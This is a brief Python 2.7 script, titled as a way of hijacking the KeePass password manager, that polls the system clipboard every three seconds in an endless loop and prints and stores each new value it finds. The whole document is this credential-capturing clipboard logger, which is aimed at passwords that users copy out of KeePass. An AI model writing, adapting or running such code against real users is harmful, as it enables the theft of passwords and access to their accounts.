# Hijacking KeePass password manager python 2.7
import pyperclip 
import time

list = []

while True: # infinite loop to continously check the clipboard
	if pyperclip.paste() !='None': #if the clipboard content is not empty ...
	    value = pyperclip.paste() # then we will take its value and put it into variable called value
	    print(pyperclip.paste())
	    
	    if value not in list: #now to make sure that we don't get replicated items in our list before appending the value variable into our list
	    #we gonna check if the values is stored earlier  in the first place , if not then this means this is a 	new item
	    #and we will append it to our list
	        list.append(value)
	    print(list)
	    time.sleep(3)
